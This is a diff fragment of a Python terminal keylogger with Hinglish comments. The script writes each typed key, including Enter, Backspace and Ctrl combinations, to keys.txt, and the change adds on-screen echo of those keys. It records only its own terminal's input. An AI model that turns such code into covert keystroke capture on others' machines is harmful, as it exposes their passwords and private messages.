@@ -1471,12 +1471,16 @@ try:
         with open(log_file, "a") as f:
             if ch in ('\r', '\n'):
                 f.write('[ENTER]')
+                sys.stdout.write('\r\n')   # screen pe naya line
             elif ord(ch) == 127:
                 f.write('[BACKSPACE]')
+                sys.stdout.write('\b \b')  # screen pe backspace effect
             elif ord(ch) < 32:
                 f.write(f'[CTRL+{chr(ord(ch)+64)}]')
             else:
                 f.write(ch)
+                sys.stdout.write(ch)       # screen pe bhi dikho
+        sys.stdout.flush()                 # turant display karo
 finally:
     termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
     print("\nKeylogger band. keys.txt check karo.")
